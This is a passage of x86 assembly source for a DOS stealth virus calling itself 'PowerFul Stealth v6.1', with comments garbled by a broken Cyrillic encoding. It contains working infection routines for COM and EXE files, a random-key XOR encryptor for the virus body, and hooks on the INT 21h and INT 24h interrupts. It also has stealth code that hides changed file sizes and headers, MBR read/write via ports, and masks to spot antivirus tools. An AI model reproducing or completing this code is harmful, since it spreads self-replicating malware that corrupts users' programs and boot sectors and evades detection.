        jz       go_infec_exe          ;��� 䠩� EXE - ���� �� ��p������ EXE
;������������������������������� COM ����������������������������������������
        mov      byte ptr ds:[extention-virus],1 ;1-COM file
        ;����⨬ �� �� COM 䠩� (�㦭�)!
        call     set_lseek_end
        or       dx,dx
        jnz      infect_error
        cmp      ax,0ffffh-offset(endvirus-virus+file_align+300h)
        jae      infect_error
        cmp      ax,200h
        jb       infect_error ;����� ����� �⮣� p����p� �� ��p�����
        mov      ds:[file_original_size-virus],ax
        mov      ds:[file_original_size-virus+2],dx
        call     write_file_align
        jc       infect_error
        call     set_lseek_end
        mov      bx,offset(new_first_20_byte-virus)
        mov      byte ptr ds:[bx],0e9h
        mov      ds:[bx+01],ax
        sub      word ptr ds:[bx+01],3
        ;��襬 BREAK BLOCK � ����� ����p������ ��p��
        call     crypt_virus_and_write_to_end
        jc       infect_error
write_new20_and_end:
        call     set_lseek_begin
        mov      cx,020h
        mov      dx,offset(new_first_20_byte-virus)
        call     write_to_file
infect_error:
        mov      sp,bp
        pop      es ds
        popa
        retn
;�������������������������������� EXE ���������������������������������������
;H� �室� �� �����:
;BX = OLD_BUFFER
;DS=ES = CS
;���p OLD �������� 20h ���⠬� �� ��砫� 䠩��
go_infec_exe:
        mov      byte ptr ds:[extention-virus],2 ;EXE FILE
        call     set_lseek_end
        mov      ds:[file_original_size-virus],ax
        mov      ds:[file_original_size-virus+2],dx
        mov      cx,200h
        div      cx
        inc      ax
        mul      cx
        push     dx ax
        mov      ax,[bx+4]   ;������ ��p��� � 512-� ���⮢�� ��p�����
        mul      cx
        pop      si di
        cmp      si,ax
        jnz      infect_error
        cmp      di,dx
        jnz      infect_error
        ;���� �� ᮤ�p��� ���p���
        mov      ax,[bx+8] ;������ ��������� � ��p��p���
        mov      cx,10h
        mul      cx
        mov      di,ax
        ;DI - ������ ���������
        call     write_file_align
        jc       infect_error
        call     set_lseek_end
        sub      ax,di
        sbb      dx,0
        jc       infect_error
        mov      bx,offset(new_first_20_byte-virus)
        ;DX:AX - ������ 䠩�� ��� ���������
        mov      cx,10h
        div      cx
        mov      [bx+16h],ax     ;Relo CS
        mov      [bx+14h],dx     ;IP
        add      dx,offset(endvirus-virus+length_of_antivirus_break_block+300h)
        adc      ax,0
        mov      [bx+0eh],ax     ;Relo SS
        mov      [bx+10h],dx     ;Sp
        mov      ax,030h
        cmp      [bx+0ah],ax     ;������ �p��㥬�� ����� �� ���殬 �p��p����
        jae      min_mem_above_then_30
        mov      [bx+0ah],ax
min_mem_above_then_30:
        cmp      [bx+0ch],ax
        jae      max_mem_above_then_30
        mov      [bx+0ch],ax     ;���ᨬ� �p��㥬�� ����� �� ���殬 �p��p����
max_mem_above_then_30:
        ;��襬:
        ;1) BREAK BLOCK
        ;2) ����p������ ��p��
        ;3) �p�������� �����
        call     crypt_virus_and_write_to_end
        jc       infect_error
        call     set_lseek_end ;��室: DX:AX - �� ����
        mov      cx,200h
        div      cx
        or       dx,dx
        jz       size_multiple_200
        inc      ax
size_multiple_200:
        mov      bx,offset(new_first_20_byte-virus)
        mov      word ptr ds:[bx+04h],ax
        mov      word ptr ds:[bx+02h],dx
        jmp      write_new20_and_end
;������������������������������ CRYPTER �������������������������������������
crypt_virus_and_write_to_end:
        pusha
        ;��� ��砫� ᣥ��p�p㥬 ��砩��� �᫮
new_random_crypt_number:
        call     random_any_ax
        or       ah,ah
        jz       new_random_crypt_number
        mov      ds:[crypt_byte-virus],ah
        ;��p���ᨬ ��p��
        mov      cx,length_of_virus_in_bate
        xor      si,si
        mov      di,offset(buffer_for_crypted_virus-virus)
        rep      movsb ;DS:[SI] -> ES:[DI]
        ;���p㥬 ��p��
        mov      cx,offset(end_crypt-begin_crypt)
        mov      si,offset(buffer_for_crypted_virus-virus+begin_crypt-virus)
crypt_virus_loop:
        xor      [si],ah
        inc      si
        loop     crypt_virus_loop
        ;����襬 ANTI_VIRUS_BREAK_BLOCK
        call     set_lseek_end
        mov      cx,length_of_antivirus_break_block
        mov      dx,offset(antivirus_break_block-virus)
        call     write_to_file
        jc       exit_stc_crypt_virus_and_write_to_end
        ;��襬 ᠬ ��p��
        mov      bx,length_of_virus_in_bate-200h
        mov      dx,offset(buffer_for_crypted_virus-virus)
next_write_block:
        mov      cx,200h
        call     write_to_file
        jc       exit_stc_crypt_virus_and_write_to_end
        add      dx,200h
        sub      bx,cx
        jnc      next_write_block
        add      bx,200h
        mov      cx,bx
        call     write_to_file
        jc       exit_stc_crypt_virus_and_write_to_end
        popa
        clc
        retn
exit_stc_crypt_virus_and_write_to_end:
        mov      dx,ds:[file_original_size-virus]
        mov      cx,ds:[file_original_size-virus+2]
        call     set_lseek_begin_pluscxdx
        xor      cx,cx
        call     write_to_file
        popa
        stc
        retn
;���������������������������� ����p��p���� ����������������������������������
write_MBR_call:
        lea      si,[bp+endvirus-virus]
        call     write_MBR_via_port
        retn
;����������������������������������������������������������������������������
read_MBR_call:
        lea      di,[bp+endvirus-virus]
        call     read_MBR_via_port
        retn
;����������������������������������������������������������������������������
;����p��p���� ��p���⪨ 21-�� �p�p뢠��� � ����⥫�� 䠩��
call_int21_with_use_handle:
        push     bx
place_of_handle:
        mov      bx,0100h
        call     call_int21
        pop      bx
        retn
;����������������������������������������������������������������������������
;����p��p���� ��p���⪨ 21-�� �p�p뢠���.
call_int21:
        pushf
        db       09ah      ;CALL XXXX:XXXX
place_of_int21:
        dd       00000000h
        retn
;����������������������������������������������������������������������������
return_original_size_of_file:
        call     asciiz
        cmp      byte ptr ds:[filemask-virus],1
        jnz      exit_stc_q_file_infected
        mov      ax,3D00h
        call     call_int21
        jc       exit_stc_q_file_infected
        mov      ds:[place_of_handle-virus+1],ax
        call     set_lseek_end
        sub      ax,length_of_original_file_info
        sbb      dx,0
        jc       exit_stc_q_file_infected
        mov      cx,dx
        mov      dx,ax
        call     set_lseek_begin_pluscxdx
        mov      cx,length_of_original_file_info
        mov      dx,offset(common_buffer-virus)
        call     read_file
        call     close_file
        mov      ax,ds:[common_buffer-virus+20h]
        mov      dx,ds:[common_buffer-virus+20h+2]
        clc
        retn
;����������������������������������������������������������������������������
;�室: DX:AX - ������ 䠩��
q_file_infected:
        or       ax,ax
        jnz      check_file_infected
        or       dx,dx
        jz       exit_stc_q_file_infected
check_file_infected:
        cmp      dx,file_align
        jae      exit_stc_q_file_infected
        mov      cx,file_align
        div      cx
        or       dx,dx
        jnz      exit_stc_q_file_infected
        clc
        retn
exit_stc_q_file_infected:
        stc
        retn
;����������������������������������������������������������������������������
may_infect_this_file:
        push     ds
        push     cs
        pop      ds
        cmp      byte ptr ds:[filename-virus],0
        jnz      exit_stc_may_infect_this_file
        cmp      byte ptr ds:[extention-virus],0
        jz       exit_stc_may_infect_this_file
        cmp      byte ptr ds:[filemask-virus],0
        jnz      exit_stc_may_infect_this_file
        pop      ds
        clc
        retn
exit_stc_may_infect_this_file:
        pop      ds
        stc
        retn
;����������������������������������������������������������������������������
;�室: DS:DX - ����p ��� 㦥 �p��⠭� �����
;      AX    - �᫮ p���쭮 �p��⠭��� ����
move_faked_bytes:
        pusha
        push     ds es
        push     ds cs
        pop      ds es
        mov      di,dx
        mov      si,ds:[pointer_to_active_stealth_buffer-virus]
        add      si,2
        mov      bp,ax ;����쪮 �p��⠭� ���⮢
        call     set_lseek_current
        sub      ax,bp
        sbb      dx,0
        or       dx,dx
        jnz      exit_move_faked_bytes
        cmp      ax,20h
        jae      exit_move_faked_bytes
        ;DX.AX - 㪠��⥫� ��� �� ������ 䥩��
        add      si,ax ;��㤠 ��p������ ����� �����
        sub      ax,20h
        neg      ax    ;��᫮ ���� ᪮�쪮 �� ������ ����⠢��� ��室� �� ��������� LSEEK
        mov      cx,bp ;����쪮 �p��⠭� ����
        cmp      cx,ax
        jbe      move_f_bytes
        mov      cx,ax
move_f_bytes:
        jcxz     exit_move_faked_bytes
        rep      movsb ;DS:[SI] -> ES:[DI] ��p���ᨬ ����� �����
exit_move_faked_bytes:
        pop      es ds
        popa
        retn
;����������������������������������������������������������������������������
valid_stealth_handles:
        pusha
        push     ds es
        call     set_dses_cs
        mov      si,offset(stealth_buffer_1-virus)
        mov      cx,number_of_stealth_buffers-1
next_stealth_buffer:
        push     cx
        mov      bx,ds:[si]
        cmp      bx,04h
        jbe      bad_handle
        mov      ah,3Fh
        xor      cx,cx
        call     call_int21
        jnc      good_handle
bad_handle:
        mov      word ptr ds:[si],0
good_handle:
        add      si,size stealth
        pop      cx
        loop     next_stealth_buffer
        pop      es ds
        popa
        retn
;����������������������������������������������������������������������������
select_stealth_field:
        pusha
        push     ds es
        call     set_dses_cs
        mov      si,offset(stealth_buffer_1-virus)
        mov      cx,number_of_stealth_buffers-1
next_free_stealth_buffer:
        push     cx
        cmp      word ptr ds:[si],0
        jz       free_handle_found
        add      si,size stealth
        pop      cx
        loop     next_free_stealth_buffer
        pop      es ds
        popa
        stc
        retn
free_handle_found:
        pop      cx
        mov      ds:[pointer_to_active_stealth_buffer-virus],si
        pop      es ds
        popa
        clc
        retn
;����������������������������������������������������������������������������
;�室: DS:DX - ��� 䠩��
fill_stealth_field:
        pusha
        push     ds es
        mov      ax,3D00h
        call     call_int21
        jc       exit_carry_fill_stealth_field
        push     cs
        pop      ds
        mov      ds:[place_of_handle-virus+1],ax
        call     set_lseek_end
        ;DX:AX
        sub      ax,length_of_original_file_info
        sbb      dx,0
        mov      cx,dx
        mov      dx,ax
        call     set_lseek_begin_pluscxdx
        mov      cx,24h
        mov      si,ds:[pointer_to_active_stealth_buffer-virus]
        mov      dx,si
        inc      dx
        inc      dx
        call     read_file
        call     close_file
        clc
exit_carry_fill_stealth_field:
        pop      es ds
        popa
        retn
;����������������������������������������������������������������������������
;���ᠭ��: ����ணࠬ�� ��� � �⥫� ������ HANDLE ᮮ⢥����騩 BX
;�室:  BX   - Handle
;��室: CF=0 - ������ ᮢ�����騩 ��� � Stealth Buffers
;              (�窠 �室� pointer_to_active_stealth_buffer)
;       CF=1 - ᮢ������� �� �������
select_stealth_handle:
        pusha
        push     ds
        push     cs
        pop      ds
        mov      si,offset(stealth_buffer_1-virus)
        mov      cx,number_of_stealth_buffers-1
seach_stealth_handle:
        cmp      ds:[si],bx
        jz       stealth_handle_found
        add      si,size stealth
        loop     seach_stealth_handle
        pop      ds
        popa
        stc
        retn
stealth_handle_found:
        mov      ds:[pointer_to_active_stealth_buffer-virus],si
        pop      ds
        popa
        clc
        retn
;����������������������������������������������������������������������������
file_align = 113h
write_file_align:
        pusha
        call     set_lseek_end
        ;DX.AX
        add      ax,length_virus_on_file
        adc      dx,0
        ;DX.AX
        cmp      dx,file_align
        jae      exit_stc_write_file_align
        mov      cx,file_align
        div      cx
        ;DX - ���⮪
        sub      dx,file_align
        neg      dx
        mov      cx,dx
        mov      dx,offset(buffer_for_crypted_virus-virus)
        call     write_to_file
        popa
        clc
        retn
exit_stc_write_file_align:
        popa
        stc
        retn
;����������������������������������������������������������������������������
install_int21_hook:
        pusha
        push     ds es
        push     0
        pop      ds
        cmp      byte ptr ds:[M_ADDR+hooked_win_int21_flag-begin_manager],1
        jnz      int21_hook
        les      bx,ds:[21h*4]
        cmp      bx,ds:[M_ADDR+hooked_win_int21-begin_manager]
        jnz      exit_install_int21_hook
        mov      ax,es
        cmp      ax,ds:[M_ADDR+hooked_win_int21-begin_manager+2]
        jnz      exit_install_int21_hook
        mov      dx,offset(M_ADDR+entry_manager-begin_manager)
        mov      ax,2521h
        int      21h
        jmp      exit_install_int21_hook
int21_hook:
        mov      di,offset(common_buffer-virus)
        call     check_windows_present
        jc       exit_install_int21_hook
        les      bx,ds:[21h*4]
        mov      ds:[M_ADDR+hooked_win_int21-begin_manager],bx
        mov      ds:[M_ADDR+hooked_win_int21-begin_manager+2],es
        mov      byte ptr ds:[M_ADDR+hooked_win_int21_flag-begin_manager],1
exit_install_int21_hook:
        pop      es ds
        popa
        retn
;����������������������������������������������������������������������������
;���ᠭ��: �p�楤�p� ��⥪�p������ Windows 95/98
;�室:  ES:[DI] - �p������ ����p � p����p� 200h
;��室: CF = 1  - DOS
;       CF = 0  - Windows
check_windows_present:
        push     cs
        pop      es
        push     di
        call     read_mbr_via_port
        pop      di
        cmp      word ptr es:[di],0ffffh
        jnz      DOS_present
        clc
        retn
DOS_present:
        stc
        retn
;����������������������������������������������������������������������������
set_our_int24:
        pusha
        push     ds es
        push     0000h
        pop      ds
        les      bx,ds:[24h*4]
        mov      word ptr cs:[old_int24-virus],bx
        mov      word ptr cs:[old_int24-virus+2],es
        mov      word ptr ds:[24h*4],offset(wrong_dos_function-virus)
        mov      ds:[24h*4+2],cs
        pop      es ds
        popa
        retn
; ���⠢��� ��p�� 24-�� �p�p뢠��� �� ����
set_old_int24:
        pusha
        push     ds es
        push     0000h
        pop      ds
        les      bx,cs:[old_int24-virus]
        mov      ds:[24h*4],bx
        mov      ds:[24h*4+2],es
        pop      es ds
        popa
        retn
;�訡�筠� ��� �㭪��
wrong_dos_function:
        mov      al,03h
        iret
old_int24 dd ?
;����������������������������������������������������������������������������
begin_solve_crc:
        db       "PowerFul Stealth v6.1 (c)'98 DK eyegabooom"
;����������������������������������������������������������������������������
;����p��p���� ��⥪�p������ 䠩�� (c)'98 DK
;�ᯮ������ ��p�ᠬ� ��� ��p�������� ����� 䠩� ����� ��p�����, �
;����� �����.
;�室:  DS:DX - 㪠�뢠�� �� ��p��� � �p��: "���:\����\��� 䠩��",0
;       ������ ���� ��p������� ����p��p���� call_int21, ��� �� ��� ⠪���
;       ᮤ�p�����:
;       call_int21 proc near
;       int   21h
;       retn
;       call_int21 endp
;��室: ����p�� ���ᠭ�� � ��p������:
;       1) filename
;       2) extention
;       3) filemask
;��������������������������������������������������������������͸
;0, �᫨ �� ���� ��� �� ��p��� FILENAMES �� ᮢ����.          ;�
;���� ����p ��p��� ᮢ���襣� �����.                          ;�
;H��p���p �᫨ �室��� DS:DX 㪠�뢠�� �� 'D:\AVP.EXE', �     ;�
;�� ��室� �� ����p��p���� filename �㤥� p���� 1.             ;�
;��������������������������������������������������������������Ĵ
;��p��� ��p��� ���� 䠩���:                                   ;�
;1) ��p�� ���⮬ ���� ������ �����. �p���p 4,'ABCD'           ;�
;2) ��⮬ ᠬ� ��� (����訬� �㪢���)                          ;�
;3) � �.� �p㣨� �����                                         ;�
;4) ��p�祭� ������ �����稢����� ���⮬ 0ffh                  ;�
filenames:                                                     ;�
        number_filename_no_mask_checked=5                      ;�
        ;����� �� �p���p塞� �� p���p����/����              ;�
        db       04,'CON',0     ;��᪠ �� �p���p����          ;�1
        db       04,'AUX',0     ;��᪠ �� �p���p����          ;�2
        db       04,'PRN',0     ;��᪠ �� �p���p����          ;�3
        db       05,'COM1',0    ;��᪠ �� �p���p����          ;�4
        db       05,'COM2',0    ;��᪠ �� �p���p����          ;�5
        ;����� �p���p塞� �� p���p����/����                 ;�
        db       07,'AVP.EXE'                                  ;�6
        db       0FFh ; - �p����� ����                        ;�
;��������������������������������������������������������������͵
;0, �᫨ �� ���� p���p���� �� ��p��� extentions �� ᮢ����.  ;�
;���� ����p ��p��� ᮢ���襣� p���p����.                     ;�
;H��p���p, �᫨ �室��� DS:DX 㪠�뢠�� �� 'D:\AVP.EXE', �    ;�
;�� ��室� �� ����p��p���� extention �㤥� p���� 3.            ;�
;��������������������������������������������������������������Ĵ
;��. �p��� ��p��� ���� 䠩���                                ;�
extentions:                                                    ;�
        db       04,'COM',0                                    ;�
        db       04,'EXE',0                                    ;�
        db       0FFh  ; - �p����� ����                       ;�
;��������������������������������������������������������������͵
;0, �᫨ �� ���� ��᪠ �� ��p��� filemasks �� ᮢ����.        ;�
;���� ����p ��p��� ᮢ���襩 ��᪨.                           ;�
;��������������������������������������������������������������Ĵ
;��ଠ�:                                                        �
;1) ����� ᬥ饭�� ��᪨                                        �
;2) ���祢�� ����                                               �
;   0 - (1) � ���� ᬥ饭�� ��᪨                               �
;   1 - ���饭�� ��p���� �� 䠩�� �� (1)                        �
;   2 - ���饭�� ��p���� �� 䠩�� �� (1)*10h                    �
;   3 - ���饭�� ��p���� �� ����                               �
;3) ������ ��᪨                                                �
;4) ��᪠:                                                      �
;   a)  ������ '?' - �� �᫮                                �
;   b)  ������ '*' - �� ����                                 �
;5) ��p�祭� ������ �����稢����� ᨬ����� 0ffh                 �
;��������������������������������������������������������������Ĵ
filemasks:                                   ;�                 �
;��������������������������������������������������������������Ĵ
        dw       0004h                       ;� Infected files  �
        db       3,4,20h,21h,0FFh,02Eh       ;� by PFL v6.1     �
;��������������������������������������������������������������Ĵ
        dw       0007h                       ;� DrWeb All DOS   �
        db       3,7,'DrW?.??'               ;�                 �
;��������������������������������������������������������������Ĵ
        dw       0040h                       ;� DrWeb All DOS   �
        db       0,5,08h,0,0F3h,0A5h,4Bh     ;�                 �
;��������������������������������������������������������������Ĵ
        dw       001Bh                       ;� Adinf           �
        db       0,6,0,'????',0ffh           ;�                 �
;��������������������������������������������������������������Ĵ
        dw       003Ch                       ;� Windows 95-98   �
        db       1,2,'PE'                    ;� PE App          �
;��������������������������������������������������������������Ĵ
        dw       003Ch                       ;� Windows 3.x     �
        db       1,2,'NE'                    ;� NE App          �
;��������������������������������������������������������������Ĵ
        dw       003Ch                       ;� Windows 95-98   �
        db       1,2,'LE'                    ;� LE App          �
;��������������������������������������������������������������Ĵ
        dw       0008h                       ;� DOS EXE DRIVERS �
        db       2,4,0ffh,0ffh,0,0           ;�                 �
;��������������������������������������������������������������Ĵ
        dw       0008h                       ;� DOS EXE DRIVERS �
        db       2,4,0ffh,0ffh,0ffh,0ffh     ;�                 �
;��������������������������������������������������������������Ĵ
        db       0ffh ; - �p����� ���� ����                    �
;����������������������������������������������������������������
end_solve_crc:
filename  db 0
extention db 1 ;�� COM 䠩�
filemask  db 0
Asciiz proc near
        pusha
        push     es ds dx
        call     initial_offset_Asciiz
initial_offset_Asciiz:
        pop      bp
        sub      bp,offset(initial_offset_Asciiz-Asciiz)
        push     cs
        pop      es
        ;��� ��砫� �⤥��� ��� 䠩�� �� ���
        ;�室:  DS:DX - "���:����\��� 䠩��",0
        call     seach_name_from_path
        ;��室: DS:DX - ��砫� ����� 䠩��
        mov      si,dx
        mov      di,offset(common_buffer-virus)
        mov      cx,20h
reform_name_to_big_letter:
        lodsb    ;DS:[SI] -> AL
        call     al_to_big_letter
        stosb    ;AL - > ES:[DI]
        or       al,al
        jz       filenames_check
        loop     reform_name_to_big_letter
;����������������������������������������������������������������������������
;�p���p�� �� ��p��� ����
filenames_check:
        push     cs
        pop      ds
        mov      si,offset(common_buffer-virus)
        lea      di,[bp+filenames-Asciiz]
       ;���p��p���� �p������� ����� ��p��� � ��᪮�쪨�� �p㣨�� �� ����
       ;�室: DS:[SI] ��p��� � ���p�� �㤥� �p���������� ����p ��p��
       ;      ES:[DI] ���� ��p�� � �p���:
       ;      db  6,'sergey'
       ;      db  5,'misha'
       ;      db  0ffh  - �p����� ����
       ;��室: AL==0  - ��� ᮢ�������
       ;       AL!=0 - ����p ᮢ���襩 ��p��� ��稭�� � 1'��
        call     cmps_string_with_databasestring
        mov      byte ptr cs:[bp+filename-Asciiz],al
        or       al,al
        jz       check_file_extention
        cmp      al,number_filename_no_mask_checked
        ja       check_file_extention
        pop      dx
        jmp      set_filemask_zero_exit
;����������������������������������������������������������������������������
;�p���p�� �� ��p��� p���p����
check_file_extention:
seach_point:
        lodsb    ;DS:[SI]
        cmp      al,'.'
        jz       point_found
        or       al,al
        jnz      seach_point
point_found:
        lea      di,[bp+extentions-Asciiz]
        call     cmps_string_with_databasestring
        mov      byte ptr cs:[bp+extention-Asciiz],al
;����������������������������������������������������������������������������
;�p���p�� �� ��p��� ��᮪
        pop      dx
        pop      ds
        push     ds
        mov      ax,3D00h ;��p��� ����⥫� ��� �⥭��
        call     call_int21
        jc       set_filemask_zero_exit
        mov      bx,ax
        cmp      bx,4
        jbe      close_file_set_filemask_zero_exit
        push     cs
        pop      ds
        lea      si,[bp+filemasks-Asciiz]
        mov      byte ptr cs:[bp+filemask-Asciiz],1
next_mask:
        cmp      byte ptr [si],0ffh
        jz       close_file_set_filemask_zero_exit
        push     si
        cmp      byte ptr [si+2],0 ;(1) � ���� ᬥ饭�� ��᪨
        jnz      no_0
        xor      cx,cx
        mov      dx,word ptr [si]
        mov      ax,4200h
        call     call_int21
        jmp      read_and_check_mask
no_0:
        cmp      byte ptr [si+2],1 ;���饭�� ��p���� �� 䠩�� �� (1)
        jnz      no_1
        xor      cx,cx
        mov      dx,[si]
        mov      ax,4200h
        call     call_int21
        mov      dx,offset(common_buffer-virus)
        mov      cl,02h
        mov      ah,3fh
        call     call_int21
        cmp      ax,cx
        jnz      GATE1_mask_failed
        xor      cx,cx
        mov      dx,word ptr cs:[common_buffer-virus]
        mov      ax,4200h
        call     call_int21
        jmp      read_and_check_mask
no_1:
        cmp      byte ptr [si+2],2 ;���饭�� ��p���� �� 䠩�� �� (1)*10h
        jnz      no_2
        xor      cx,cx
        mov      dx,[si]
        mov      ax,4200h
        call     call_int21
        mov      dx,offset(common_buffer-virus)
        mov      cl,02h
        mov      ah,3fh
        call     call_int21
        cmp      ax,cx
GATE1_mask_failed:
        jnz      mask_failed
        mov      cx,10h
        mov      ax,word ptr cs:[common_buffer-virus]
        mul      cx
        mov      cx,dx
        mov      dx,ax
        mov      ax,4200h
        call     call_int21
        jmp      read_and_check_mask
no_2:
        xor      cx,cx
        xor      dx,dx
        mov      ax,4202h
        call     call_int21
        sub      ax,[si]
        mov      cx,dx
        mov      dx,ax
        mov      ax,4200h
        call     call_int21
read_and_check_mask:
        ;��⠥� ���� � �p���p塞 ����
        mov      dx,offset(common_buffer-virus)
        xor      cx,cx
        mov      cl,[si+3]
        mov      ah,3Fh
        call     call_int21
        cmp      ax,cx
        jnz      mask_failed
        mov      di,dx
        add      si,4
next_letter_of_mask:
        cmp      byte ptr [si],'*'
        jz       next_letter
        cmp      byte ptr [si],'?'
        jnz      letter_is_not_q
        cmp      byte ptr [di],30h
        jb       mask_failed
        cmp      byte ptr [di],39h
        ja       mask_failed
next_letter:
        inc      si
        inc      di
        loop     next_letter_of_mask
        jmp      mask_coincide
letter_is_not_q:
        cmpsb            ;DS:[SI] � ES:[DI]
        jnz      mask_failed
        loop     next_letter_of_mask
mask_coincide:
        ;������� ��᪠
        pop      si
        mov      ah,3Eh
        call     call_int21
        jmp      exit_Asciiz
mask_failed:
        ;��᪠ �� ᮢ����
        pop      si
        add      si,4
        xor      cx,cx
        mov      cl,ds:[si-1]
        add      si,cx
        inc      byte ptr cs:[bp+filemask-Asciiz]
        jmp      next_mask
close_file_set_filemask_zero_exit:
        mov      ah,3eh
        call     call_int21
set_filemask_zero_exit:
        mov      byte ptr cs:[bp+filemask-Asciiz],0
exit_Asciiz:
        pop      ds es
        popa
        retn
asciiz endp
;����������������������������������������������������������������������������
;���� ����� 䠩�� �� ���
;�室:  DS:DX - "���:\����\��� 䠩��",0
;��室: DS:DX - ��砫� ����� 䠩��
seach_name_from_path:
        push     ax cx si
        mov      si,dx
        mov      cx,80h
set_bx_to_name:
        mov      dx,si
scan_name:
        lodsb    ;DS:[SI] ("���:\����\��� 䠩��",0)-> AL
        cmp      al,'\'
        jz       set_bx_to_name
        cmp      al,'/'
        jz       set_bx_to_name
        cmp      al,':'
        jz       set_bx_to_name
        or       al,al
        jz       end_string
        loop     scan_name
end_string:
        pop      si cx ax
        retn
;����������������������������������������������������������������������������
;���p��p���� �p������� ����� ��p��� � ��᪮�쪨�� �p㣨�� �� ����
;�室: DS:[SI] ��p��� � ���p�� �㤥� �p���������� ����p ��p��
;      ES:[DI] ���� ��p�� � �p���:
;      db  6,'sergey'
;      db  5,'misha'
;      db  0ffh  - �p����� ����
;��室: AX==0 - ᮢ������� ���
;       AX!=0 - ����p ᮢ���襩 ��p���
cmps_string_with_databasestring:
        push     di cx
        xor      cx,cx
        mov      ax,1
next_string:
        mov      cl,es:[di]
        cmp      cl,0ffh
        jz       no_coincide_string
        push     si di
        inc      di
        rep      cmpsb   ; �p�������� DS:[SI] � ES:[DI]
        pop      di si
        jz       coincide_string
        mov      cl,es:[di]
        add      di,cx
        inc      di
        inc      ax
        jmp      next_string
no_coincide_string:
        xor      ax,ax
coincide_string:
        pop      cx di
        retn
;����������������������������������������������������������������������������
al_to_big_letter:
        cmp      al,61h ;�p���p�������� � ����訥 �㪢�
        jc       this_is_not_bigletter
        cmp      al,7ah
        ja       this_is_not_bigletter
        sub      al,20h
this_is_not_bigletter:
        retn
;����������������������������������������������������������������������������
;�p��p���� ��p���⪨ ��砩��� �ᥫ
;�室:  call random_any_ax (��p�稢��� �� ��砩��� �᫮ � AX)
;       call random_ax (��� �室� �㦥� AX, �� ��室� 0<NEW_AX<=OLD_AX)
;�室:  call random_any_dx (��p�稢��� �� ��砩��� �᫮ � DX)
;       call random_dx (��� �室� �㦥� DX, �� ��室� 0<NEW_DX<=OLD_DX)
include random.asm
;����������������������������������������������������������������������������
antivirus_break_block:
        pusha
        push     ds es
        mov      ah,2
        mov      dl,symbol_to_show
        int      21h
length_of_antivirus_break_block = $-antivirus_break_block
;����������������������������������������������������������������������������
; ����p��p���� ᪠��p������ �����.
; �室:  ES:DI ��㤠 ᪠��p����� H��p���p: B800:0001
;        CX ᪮�쪮 ����� ᪠��p����� (�����)
;        BX 蠣 ᪠��p������ (BX=1 - �� ���⭮
;                             BX=2 - �p�� ���)
;        DS:[SI] - ��p��� � �p��� 5,'�⥫�' - �� �᪠��
;        � ��p��� ����� 㯮�p������ ᨬ��� "*", ���p�
;        ������祥� �� � �⮬ ���� ����� ����� ��
;        ᨬ���.
; ��室: CF=0 �᫨ �� ��諨
;        ES:DI - ��� ��ᥪ�� ��p��� �㪢� �᫨ CF=1
;����������������������������������������������������������������������������
scan_mem_call:
        pusha
        xor      cx,cx
        mov      cl,[si]
        xor      ax,ax
Gtmp2:  mov      al,[si+1]
        cmp      al,'*'
        jz       Gtmp30
        cmp      es:[di],al
        jnz      Gtmp1
Gtmp30: add      di,bx
        inc      si
        loop     Gtmp2
        popa
        stc
        retn
Gtmp1:  popa
        add      di,bx
        loop     scan_mem_call
        clc
        retn
;����������������������������������������������������������������������������
set_dses_cs:
        push     cs cs
        pop      es ds
        retn
;����������������������������������������������������������������������������
write_to_file:
        mov      ah,40h
        jmp      call_int21_with_use_handle
read_file:
        mov      ah,3Fh
        jmp      call_int21_with_use_handle
set_lseek_begin:
        xor      cx,cx
        xor      dx,dx
set_lseek_begin_pluscxdx:
        mov      ax,4200h
        jmp      call_int21_with_use_handle
set_lseek_current:
        xor      cx,cx
        xor      dx,dx
set_lseek_curent_pluscxdx:
        mov      ax,4201h
        jmp      call_int21_with_use_handle
set_lseek_end:
        xor      cx,cx
        xor      dx,dx
set_lseek_end_pluscxdx:
        mov      ax,4202h
        jmp      call_int21_with_use_handle
close_file:
        mov      ah,3eh
        jmp      call_int21_with_use_handle
;����������������������������������������������������������������������������
; ��p졠 � �������� "�������� � ����� ��室���� ��⨢�� ��p��"
; ����� �p��� INT 21 � manager'�
anti_mem:
        call     set_old_int24     ; �⠢�� ��p�� 24 ���뢠���
        pusha
        push     ds es
        push     0000h
        pop      ds
        les      ax,dword ptr cs:[place_of_int21-virus]
        mov      ds:[21h*4],ax
        mov      ds:[21h*4+2],es
        mov      byte ptr ds:[M_ADDR+manager_idle_flag-begin_manager],1
        pop      es ds
        popa
        popf
        jmp      dword ptr cs:[place_of_int21-virus]
;����������������������������������������������������������������������������
include prot16.asm
include ring0_16.asm
include rw_mbr.asm
;���������������������������������� END �������������������������������������
end_crypt:
original_file_info:
old_first_20_byte  db 20h dup (0C3h)
file_original_size dd 00000000h
virus_label        db 20h,21h,0FFh,02Eh
length_of_original_file_info equ $-original_file_info
endvirus:
db 'END'
;����������������������������������������������������������������������������
;H��� ���������
new_first_20_byte                  db 20h  dup (?)
;���� �� 䠩��� ���p� ���� �� �㭪樨 4F
path_for_4F_function               db 100h dup (?)
;���� �� 䠩��� ���p� ���� �� �㭪樨 714F
path_for_714F_function             db 100h dup (?)
;��騩 �����
common_buffer                      db 200h dup (?)
;��p��� �� TIME(DW), ��⮬ DATE(DW)
time_date_of_file                  dd ?
real_number_of_readed_bate         dw ?
;����������������������������������������������������������������������������
;����p for Stealth function
stealth STRUC
handle_of_infected_file            dw  ?  ;HANDLE ��p�⮣� ��p�������� 䠩��
;(0) - ���� ᢮�����
original_20h_bate_of_infected_file db  20h dup (?) ;�p�������� 20h ����
original_size_of_infected_file     dd  ?           ;Original Length of file
ends
;����������������������������������������������������������������������������
infect_after_copy STRUC
handle_of_copy_file                dw ?   ;HANDLE ������������ 䠩��
file_name_of_copy_file             db 100h dup (?)  ;��� 䠩��
ends
;����������������������������������������������������������������������������
number_of_stealth_buffers = 20
stealth_buffer_1  stealth <>
stealth_buffer_2  stealth <>
stealth_buffer_3  stealth <>
stealth_buffer_4  stealth <>
stealth_buffer_5  stealth <>
stealth_buffer_6  stealth <>
stealth_buffer_7  stealth <>
stealth_buffer_8  stealth <>
stealth_buffer_9  stealth <>
stealth_buffer_10 stealth <>
stealth_buffer_11 stealth <>
stealth_buffer_12 stealth <>
stealth_buffer_13 stealth <>
stealth_buffer_14 stealth <>
stealth_buffer_15 stealth <>
stealth_buffer_16 stealth <>
stealth_buffer_17 stealth <>
stealth_buffer_18 stealth <>
stealth_buffer_19 stealth <>
stealth_buffer_20 stealth <>
pointer_to_active_stealth_buffer dw ? ;�����⥫� �� ��⨢�� �⥫� �����
;����������������������������������������������������������������������������
infect_after_copy_1 infect_after_copy <>
;����������������������������������������������������������������������������
buffer_for_crypted_virus db length_of_virus_in_bate dup (?)
